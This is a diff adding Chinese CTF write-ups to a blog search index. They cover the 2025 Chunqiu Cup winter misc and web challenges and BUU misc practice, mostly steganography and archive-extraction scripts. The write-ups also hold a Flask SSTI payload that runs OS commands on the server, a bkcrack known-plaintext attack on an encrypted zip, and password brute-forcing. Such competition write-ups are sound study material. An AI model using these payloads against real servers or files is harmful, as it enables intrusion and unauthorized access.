@@ -1,6 +1,505 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2025春秋杯冬季赛</title>
+    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
+    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
+<p>听C3师傅说这还不算是上强度的</p>
+<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
+<p>还是要多练，下次努力不啃Misc老底</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
+<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
+<p>解析得到</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
+<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
+<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
+<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
+<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
+<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
+<pre><code class="highlight python"><span class="keyword">import</span> zipfile
+<span class="keyword">import</span> re
+zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
+<span class="keyword">while</span> <span class="literal">True</span>:
+    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
+        ts1 = zipfile.ZipFile(zipname)
+        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
+        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
+        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
+    <span class="keyword">else</span>:
+        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>
+
+<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
+<pre><code class="highlight python"><span class="keyword">import</span> zipfile
+<span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+
+<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        encoded_password = f.read().strip()
+    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+    <span class="keyword">return</span> decoded_password
+<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
+    <span class="keyword">try</span>:
+        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
+            zf.extractall(path=extract_to, pwd=password.encode())
+            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
+            <span class="keyword">return</span> zf.namelist()  
+    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
+        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
+        <span class="keyword">return</span> []
+<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
+    current_number = start_number
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
+        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
+        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
+            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
+            <span class="keyword">break</span>
+        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
+            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
+            <span class="keyword">break</span>
+        password = decode_password(password_filename)
+        extracted_files = extract_zip(zip_filename, password,parent_dir)
+        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
+            <span class="keyword">break</span>
+        next_zip_file = <span class="literal">None</span>
+        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
+            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
+                next_zip_file = extracted_file
+                <span class="keyword">break</span>
+        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
+            <span class="keyword">break</span>
+        current_number -= <span class="number">1</span>
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    recursive_extract()</code></pre>
+
+<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
+<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
+<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> base64
+
+
+<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        encoded_password = f.read().strip()
+    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+    <span class="keyword">return</span> decoded_password
+
+<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
+    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
+        current_number = start_number
+        <span class="keyword">while</span> <span class="literal">True</span>:
+            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
+            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
+                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
+                <span class="keyword">break</span>
+            decoded_password = decode_password(password_filename)
+            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
+            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
+            current_number += <span class="number">1</span>
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>
+
+<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
+<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
+<p>拿到一张png，用010查一下看到zip头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
+<p>foremost提取一下</p>
+<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
+<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
+<p>脚本：</p>
+<pre><code class="highlight plaintext">import os
+import zipfile
+import tarfile
+import py7zr
+import shutil
+
+
+def extract_zip(zip_path, extract_dir):
+    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
+    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
+        zip_ref.extractall(extract_dir)
+        return zip_ref.namelist()  # 返回解压出来的文件列表
+
+
+def extract_tar(tar_path, extract_dir):
+    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
+    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
+        tar_ref.extractall(extract_dir)
+        return tar_ref.getnames()  # 返回解压出来的文件列表
+
+
+def extract_7z(archive_path, extract_dir):
+    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
+    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
+        archive_ref.extractall(extract_dir)
+        return archive_ref.getnames()  # 返回解压出来的文件列表
+
+
+def handle_compressed_file(file_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
+    if file_path.endswith(&#x27;.zip&#x27;):
+        extracted_files = extract_zip(file_path, extract_dir)
+    elif file_path.endswith(&#x27;.tar&#x27;):
+        extracted_files = extract_tar(file_path, extract_dir)
+    elif file_path.endswith(&#x27;.7z&#x27;):
+        extracted_files = extract_7z(file_path, extract_dir)
+    else:
+        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
+        return []
+
+    # 记录去掉后缀并连接的文件名
+    with open(output_txt, &#x27;a&#x27;) as output_file:
+        for file_name in extracted_files:
+            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
+            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)
+
+    return extracted_files
+
+
+def process_zip(zip_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
+    # 解压当前zip文件并返回解压后的文件列表
+    extracted_files = extract_zip(zip_path, extract_dir)
+
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue  # 跳过目录
+
+        # 如果解压出来的是压缩包，再进行递归处理
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            # 解压嵌套压缩包并处理
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            # 如果是嵌套的压缩包，再递归调用
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+        else:
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if zip_path.endswith(&#x27;.zip&#x27;):
+        os.remove(zip_path)
+
+
+def process_tar(tar_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
+    extracted_files = extract_tar(tar_path, extract_dir)
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue
+
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if tar_path.endswith(&#x27;.tar&#x27;):
+        os.remove(tar_path)
+
+
+def process_7z(archive_path, extract_dir, output_txt):
+    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
+    extracted_files = extract_7z(archive_path, extract_dir)
+    for extracted_file in extracted_files:
+        extracted_file_path = os.path.join(extract_dir, extracted_file)
+
+        if os.path.isdir(extracted_file_path):
+            continue
+
+        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
+            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
+            if extracted_file.endswith(&#x27;.zip&#x27;):
+                process_zip(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.tar&#x27;):
+                process_tar(extracted_file_path, extract_dir, output_txt)
+            elif extracted_file.endswith(&#x27;.7z&#x27;):
+                process_7z(extracted_file_path, extract_dir, output_txt)
+
+    # 删除当前处理的压缩包
+    if archive_path.endswith(&#x27;.7z&#x27;):
+        os.remove(archive_path)
+
+
+def main():
+    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
+    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
+    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
+
+    if not os.path.exists(extract_dir):
+        os.makedirs(extract_dir)
+
+    # 开始处理压缩包
+    with open(output_txt, &#x27;w&#x27;) as output_file:
+        output_file.write(&quot;&quot;)
+    process_zip(zip_path, extract_dir, output_txt)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>再对提出来的文件名做两种处理</p>
+<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
+    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
+    with open(input_txt, &#x27;r&#x27;) as infile:
+        file_names = infile.readlines()
+
+    # 去掉换行符并从后往前连接
+    reversed_file_names = [name.strip() for name in reversed(file_names)]
+
+    # 将连接后的文件名写入新文件
+    with open(output_txt, &#x27;w&#x27;) as outfile:
+        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
+        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
+def remove_newlines_and_connect(input_txt, output_txt):
+    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
+    with open(input_txt, &#x27;r&#x27;) as infile:
+        # 读取所有行并去掉换行符
+        file_names = infile.read().splitlines()
+
+    # 将文件名用空格连接
+    connected_file_names = &quot;&quot;.join(file_names)
+
+    # 将连接后的文件名写入新文件
+    with open(output_txt, &#x27;w&#x27;) as outfile:
+        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
+        outfile.write(connected_file_names)  # 直接写入连接后的字符串
+
+def main():
+    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
+    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
+    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
+    reverse_file_names(input_txt, output1_txt)
+    remove_newlines_and_connect(input_txt, output2_txt)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>根据提示BASE58-Ripple、SM4-ECB</p>
+<p>先后尝试顺序的和逆序的</p>
+<p>最后逆序的得到以下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
+<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
+<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
+<p>在谷歌搜图后判断出是 DataMatrix码</p>
+<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
+<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
+<p>根据提示deepsound和弱口令</p>
+<p>试一下123？</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
+<p>运气比较好直接出来了</p>
+<p>提取zip后发现需要密码打开</p>
+<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
+<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
+<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
+bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
+
+<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
+<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>
+
+<p>得到flag.png</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
+<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
+<p>先试着打一下，看看有没有绕过</p>
+<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
+<p>直接爆了，那就ls换cat flag解决</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
+]]></content>
+      <tags>
+        <tag>-CTF -misc -WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU—MISC刷题记录</title>
+    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
+<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
+<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
+<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
+<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
+<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
+<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
+<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
+<p>主要是HTTP流量，直接追踪流</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
+<p>用<code>captfencoder</code>MD5一下结束战斗</p>
+<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
+<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
+<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
+<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
+<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
+<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
+<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
+<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
+<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
+<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
+<p>查完没有藏文件，那应该就是隐写了</p>
+<p>结果没有发现隐写，感觉被骗了</p>
+<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
+<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
+<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
+<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
+<p>成功了，打开提取的文件发现有PK头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
+<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
+<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
+<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
+<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
+<p>foremost出一下，要密码，先尝试弱密码爆破</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
+<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
+<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
+<p>看来是改了后缀，010先查查看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
+<p>演都不演了…</p>
+<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
+<p>盯完帧没有东西，看看副本，发现已经损坏</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
+<p>（这里-其实是_）</p>
+<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
+<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
+<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
+<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
+<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
+<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
+</blockquote>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
+<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
+<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
+crc32 flag.jpg</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
+<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
+<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
+<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
